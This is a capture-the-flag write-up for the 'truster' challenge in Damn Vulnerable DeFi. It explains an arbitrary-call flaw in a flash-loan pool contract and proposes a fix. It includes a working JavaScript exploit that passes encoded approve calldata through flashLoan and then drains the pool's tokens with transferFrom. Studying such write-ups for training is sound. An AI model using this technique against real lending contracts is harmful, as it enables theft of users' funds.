# Damn Vulnerable DeFi

Damn Vulnerable DeFi is the wargame to learn offensive security of DeFi smart contracts.

Throughout numerous challenges you will build the skills to become a bug hunter or security auditor in the space.

https://www.damnvulnerabledefi.xyz/

# Introduction

truster is the third challenge in the Damn Vulnerable DeFi series.

Challenge description: 
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
Currently the pool has 1 million DVT tokens in balance. And you have nothing.
But don't worry, you might be able to take them all from the pool. In a single transaction.

Challenge goal:
Transfer all the DVT in the TrusterLenderPool contract to yourself(attacker).

# Findings 

## Critical Risk
### Arbitrary contract call

**Context:** [`FlashLoanReceiver.sol#L36`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/contracts/truster/TrusterLenderPool.sol)

**Description:**
flashLoan function sends an arbitrary transaction to an arbitrary address. Although it checks that contract balance does not decrease after the transaction, it can be used for approving an arbitrary address to transfer DVT tokens on behalf of the contract.

```solidity
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```
**Recommendation:**
TrusterLenderPool contract should implement a flash loan receiver interface with an appropriate function and call it from flashLoan function instead of sending arbitrary transactions

```diff
+ interface FlashLoanReceiver 
- target.functionCall(data);
```

# How To Solve The Challenge
encode transaction parameters for approving the attacker address to transfer DVT tokens on behalf of the contract use it as data parameter and use DVT address for target parameter. After that use ERC20.transferFrom and drain all the tokens.

**Context:** [`truster.challenge.js#L30-L34`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/test/truster/truster.challenge.js)

```javascript
it('Exploit', async function () {
    data = "0x095ea7b300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000004ee2d6d415b85acef8100000000";
    this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
    this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
});
```